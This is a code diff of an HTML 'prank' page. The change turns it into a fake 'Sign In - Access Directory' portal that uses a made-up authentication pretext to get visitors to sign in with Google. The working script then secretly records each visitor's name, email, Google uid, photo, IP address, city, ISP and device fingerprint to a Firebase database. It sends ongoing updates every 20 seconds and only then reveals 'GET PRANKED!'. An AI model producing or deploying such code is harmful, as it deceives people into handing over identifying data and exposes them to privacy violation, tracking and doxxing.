@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GET PRANKED! 🎉</title>
+    <title>Sign In - Access Directory</title>
     <style>
         * {
             box-sizing: border-box;
@@ -25,6 +25,67 @@
         .container {
             z-index: 10;
             padding: 20px;
+            max-width: 450px;
+            width: 90%;
+        }
+        
+        /* Interactive Auth View Card */
+        .auth-card {
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 40px 30px;
+            border-radius: 16px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
+        }
+        .auth-card h2 {
+            margin-bottom: 10px;
+            font-size: 1.8rem;
+            font-weight: 600;
+        }
+        .auth-card p {
+            font-size: 0.95rem;
+            color: #aaa;
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+
+        /* Customized Google Button Style */
+        .google-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #ffffff;
+            color: #1f1f1f;
+            font-size: 0.95rem;
+            font-weight: 500;
+            font-family: 'Roboto', 'Segoe UI', sans-serif;
+            padding: 0 16px;
+            height: 44px;
+            border: 1px solid #747775;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color .218s, border-color .218s, box-shadow .218s;
+            width: 100%;
+            max-width: 280px;
+        }
+        .google-btn:hover {
+            background-color: #f8fafd;
+            border-color: #c7c7c7;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        .google-btn:active {
+            background-color: #eeeeee;
+        }
+        .google-icon {
+            width: 18px;
+            height: 18px;
+            margin-right: 12px;
+        }
+
+        /* Prank View State Container (Hidden initially) */
+        #prank-screen {
+            display: none;
         }
         h1 {
             font-size: 4rem;
@@ -36,15 +97,11 @@
             animation: pulse 1.5s infinite alternate;
             margin-bottom: 20px;
         }
-        p {
-            font-size: 1.5rem;
-            color: #e0e0e0;
-            font-weight: 300;
-        }
         @keyframes pulse {
             from { transform: scale(1); }
-            to { transform: scale(1.05); }
+            to { transform: scale(1.04); }
         }
+
         canvas {
             position: absolute;
             top: 0;
@@ -61,16 +118,36 @@
 
     <canvas id="confetti-canvas"></canvas>
 
-    <div class="container">
-        <h1>GET PRANKED! 🎉</h1>
-        <p>Gotcha! Hope this brightened your day.</p>
+    <!-- State 1: Native Sign-In Interface -->
+    <div class="container" id="auth-screen">
+        <div class="auth-card">
+            <h2>Authentication Required</h2>
+            <p>Verify your account status to view this shared configuration workspace.</p>
+            
+            <button class="google-btn" id="login-trigger">
+                <!-- Standard SVG Google logo vector mark -->
+                <svg class="google-icon" viewBox="0 0 24 24">
+                    <path fill="#EA4335" d="M5.266 9.765A7.077 7.077 0 0 1 12 4.909c1.69 0 3.218.6 4.418 1.582L19.91 3C17.782 1.145 15.055 0 12 0 7.273 0 3.19 2.691 1.145 6.655l4.121 3.11z"/>
+                    <path fill="#4285F4" d="M23.491 12.273c0-.818-.073-1.609-.209-2.382H12v4.509h6.445a5.51 5.51 0 0 1-2.391 3.618v3.009h3.864c2.264-2.09 3.573-5.173 3.573-8.755z"/>
+                    <path fill="#FBBC05" d="M5.266 14.235A7.09 7.09 0 0 1 4.909 12c0-.791.136-1.555.357-2.265L1.145 6.655A11.93 11.93 0 0 0 0 12c0 1.927.455 3.755 1.255 5.391l4.011-3.156z"/>
+                    <path fill="#34A853" d="M12 24c3.245 0 5.973-1.073 7.964-2.918l-3.864-3.01c-1.073.719-2.445 1.155-4.1 1.155-3.155 0-5.818-2.127-6.773-5l-4.01 3.154C3.19 21.309 7.273 24 12 24z"/>
+                </svg>
+                Sign in with Google
+            </button>
+        </div>
     </div>
 
-    <!-- Firebase SDK Modules via CDN -->
+    <!-- State 2: Visual Surprise Reveal View -->
+    <div class="container" id="prank-screen">
+        <h1>GET PRANKED! 🎉</h1>
+        <p style="font-size: 1.4rem; color: #d0d0d0;">Gotcha! Hope this brightened your day.</p>
+    </div>
+
+    <!-- Firebase System Module Integration -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getDatabase, ref, push, update, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
-        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-analytics.js";
+        import { getAuth, signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyAO_ffupJOIMPE9m4ARtaqSzC1vGDkIAco",
@@ -83,24 +160,21 @@
             measurementId: "G-1JW4TQFEG2"
         };
 
+        // Initialize services
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
-        const analytics = getAnalytics(app);
+        const auth = getAuth(app);
+        const provider = new GoogleAuthProvider();
 
-        // Track active page lifetime variables
-        let currentRecordRef = null;
-        let elapsedActiveSeconds = 0;
-        let totalClickCounter = 0;
+        let sessionRecordRef = null;
+        let elapsedTrackingSeconds = 0;
 
-        // Tracks mouse clicks globally across the document to map user interaction
-        document.addEventListener('click', () => { totalClickCounter++; });
-
-        // Heavy-duty hardware profile extraction
-        function extractHardwareSpecs() {
+        // Extract deep browser configuration indicators
+        function gatherTelemetrySpecs() {
             let gpuVendor = "Unknown", gpuRenderer = "Unknown";
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const gl = canvas.getContext('webgl');
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     if (debugInfo) {
@@ -111,126 +185,123 @@
             } catch (e) {}
 
             return {
-                gpu_vendor_chipset: gpuVendor,
-                gpu_renderer_architecture: gpuRenderer,
-                logical_processor_threads: navigator.hardwareConcurrency || "Unknown",
-                system_memory_limit_gb: navigator.deviceMemory || "Unknown",
-                max_simultaneous_touch_points: navigator.maxTouchPoints || 0
+                hardware: {
+                    threads: navigator.hardwareConcurrency || "Unknown",
+                    ram_gb: navigator.deviceMemory || "Unknown",
+                    gpu_chip: gpuRenderer
+                },
+                environment: {
+                    resolution: `${window.screen.width}x${window.screen.height}`,
+                    os_platform: navigator.platform,
+                    locale_lang: navigator.language,
+                    timezone_zone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                }
             };
         }
 
-        // Grabs performance metrics including JS heap allocations
-        function capturePerformanceMetrics() {
-            const memoryData = {};
-            if (performance && performance.memory) {
-                memoryData.allocated_heap_size = `${(performance.memory.usedJSHeapSize / 1048576).toFixed(2)} MB`;
-                memoryData.total_allocated_pool = `${(performance.memory.totalJSHeapSize / 1048576).toFixed(2)} MB`;
-                memoryData.maximum_heap_limit = `${(performance.memory.jsHeapLimit / 1048576).toFixed(2)} MB`;
-            } else {
-                Object.assign(memoryData, { allocated_heap_size: "Unsupported", total_allocated_pool: "Unsupported" });
-            }
-            return memoryData;
-        }
+        // Main logging function executing after identity validation completes
+        async function logAuthenticatedUser(googleUser, clientIp, geoInfo) {
+            const clientSpecs = gatherTelemetrySpecs();
 
-        // Initialize unique record on start, then loop updates
-        async function runTelemetryPipeline() {
-            let ipAddress = "Unknown", geoData = {};
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                if (response.ok) {
-                    const data = await response.json();
-                    ipAddress = data.ip || "Unknown";
-                    geoData = { city: data.city, region: data.region, country: data.country_name, isp: data.org };
-                }
-            } catch (e) {}
-
-            // Compile immutable baseline parameters
-            const baselinePayload = {
-                network_profile: {
-                    ip_address: ipAddress,
-                    internet_provider: geoData.isp || "Unknown",
-                    connection_mode: navigator.connection ? navigator.connection.effectiveType : "Unknown"
+            // Construct cleanly mapped data scheme bundling Google profile details with device information
+            const analyticalPayload = {
+                authorized_profile: {
+                    uid: googleUser.uid,
+                    full_name: googleUser.displayName || "Not Shared",
+                    email_address: googleUser.email,
+                    is_email_verified: googleUser.emailVerified,
+                    profile_photo: googleUser.photoURL || "None",
+                    account_creation_time: googleUser.metadata.creationTime || "Unknown",
+                    last_sign_in_time: googleUser.metadata.lastSignInTime || "Unknown"
                 },
-                location_profile: {
-                    city: geoData.city || "Unknown",
-                    state_region: geoData.region || "Unknown",
-                    country: geoData.country || "Unknown"
+                network_location: {
+                    ip: clientIp,
+                    isp: geoInfo.org || "Unknown",
+                    city: geoInfo.city || "Unknown",
+                    country: geoInfo.country_name || "Unknown",
+                    connection: navigator.connection ? navigator.connection.effectiveType : "Unknown"
                 },
-                hardware_static_profile: extractHardwareSpecs(),
-                display_profile: {
-                    monitor_dimensions: `${window.screen.width}x${window.screen.height}`,
-                    pixel_ratio_density: window.devicePixelRatio,
-                    color_depth_bits: window.screen.colorDepth
-                },
-                browser_static_profile: {
-                    user_agent_raw: navigator.userAgent,
-                    kernel_platform: navigator.platform || "Unknown",
-                    system_language: navigator.language,
-                    configured_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                },
-                live_dynamic_telemetry: {
-                    time_spent_seconds: 0,
-                    interaction_clicks: 0,
-                    document_visibility_state: document.visibilityState,
-                    performance_heap_allocation: capturePerformanceMetrics(),
-                    last_synchronized_time: serverTimestamp()
+                device_hardware: clientSpecs.hardware,
+                device_environment: clientSpecs.environment,
+                runtime_updates: {
+                    active_duration_seconds: 0,
+                    last_seen_timestamp: serverTimestamp()
                 }
             };
 
-            // Set push location target folder
-            const logsRef = ref(database, 'prank_logs');
-            currentRecordRef = push(logsRef);
+            const databaseRootRef = ref(database, 'prank_logs');
+            sessionRecordRef = push(databaseRootRef);
             
-            // Push initial record block
-            await update(currentRecordRef, baselinePayload)
-                .catch((err) => console.error("Initial sync fault:", err));
+            // Initial write execution
+            await update(sessionRecordRef, analyticalPayload)
+                .catch((err) => console.error("Database initialization fault:", err));
 
-            // Start 20-second dynamic synchronization cycle
-            setInterval(async () => {
-                // Keep evaluating runtime metrics even if the tab moves to background
-                elapsedActiveSeconds += 20;
-                await syncDynamicMetrics();
+            // Flip layout container visibility states
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('prank-screen').style.display = 'block';
+            document.title = "GET PRANKED! 🎉";
+            
+            // Ignite background confetti engine loop
+            startConfettiEngine();
+
+            // Begin the 20-second background synchronization sequence
+            setInterval(() => {
+                elapsedTrackingSeconds += 20;
+                syncRuntimeTelemetry();
             }, 20000);
         }
 
-        // Updates mutable payload changes over the active interval loop
-        async function syncDynamicMetrics() {
-            if (!currentRecordRef) return;
-
-            const updatedTelemetry = {
-                "live_dynamic_telemetry/time_spent_seconds": elapsedActiveSeconds,
-                "live_dynamic_telemetry/interaction_clicks": totalClickCounter,
-                "live_dynamic_telemetry/document_visibility_state": document.visibilityState,
-                "live_dynamic_telemetry/performance_heap_allocation": capturePerformanceMetrics(),
-                "live_dynamic_telemetry/last_synchronized_time": serverTimestamp()
+        // Async loop modification function mapping persistent state
+        async function syncRuntimeTelemetry() {
+            if (!sessionRecordRef) return;
+            
+            const liveDiff = {
+                "runtime_updates/active_duration_seconds": elapsedTrackingSeconds,
+                "runtime_updates/last_seen_timestamp": serverTimestamp()
             };
 
-            // Safely push only the variable updates to the existing record node
-            update(currentRecordRef, updatedTelemetry)
-                .catch((e) => console.error("Periodic update cycle dropped:", e));
+            update(sessionRecordRef, liveDiff)
+                .catch((e) => console.error("Sync drop:", e));
         }
 
-        // Immediate callback update when tab switches visibility
-        document.addEventListener('visibilitychange', () => {
-            if (currentRecordRef) syncDynamicMetrics();
-        });
+        // Attach authentication engine execution trigger to UI element
+        document.getElementById('login-trigger').addEventListener('click', async () => {
+            let publicIp = "Unknown", locationMetadata = {};
+            
+            // Pre-fetch network attributes before running visual prompt processes
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                if (ipResponse.ok) {
+                    locationMetadata = await ipResponse.json();
+                    publicIp = locationMetadata.ip || "Unknown";
+                }
+            } catch (e) {}
 
-        runTelemetryPipeline();
+            // Open secure system OAuth popup element
+            signInWithPopup(auth, provider)
+                .then((result) => {
+                    // Extract credential token metadata variables directly out of success response mappings
+                    const userProfile = result.user;
+                    logAuthenticatedUser(userProfile, publicIp, locationMetadata);
+                })
+                .catch((error) => {
+                    console.error("Authentication popup window dismissed or aborted:", error.message);
+                });
+        });
     </script>
 
-    <!-- Continuous Confetti Engine -->
+    <!-- Continuous Confetti Engine Layout Loop -->
     <script>
-        const myCanvas = document.getElementById('confetti-canvas');
-        const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };
+        function startConfettiEngine() {
+            const canvasElement = document.getElementById('confetti-canvas');
+            const parameters = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };
+            function scopeRandom(min, max) { return Math.random() * (max - min) + min; }
 
-        function randomInRange(min, max) {
-            return Math.random() * (max - min) + min;
+            setInterval(function() {
+                confetti({ ...parameters, particleCount: 35, origin: { x: scopeRandom(0.1, 0.3), y: Math.random() - 0.2 } });
+                confetti({ ...parameters, particleCount: 35, origin: { x: scopeRandom(0.7, 0.9), y: Math.random() - 0.2 } });
+            }, 250);
         }
-
-        setInterval(function() {
-            confetti({ ...defaults, particleCount: 35, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } });
-            confetti({ ...defaults, particleCount: 35, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } });
-        }, 250);
     </script>
 </body>
 </html>
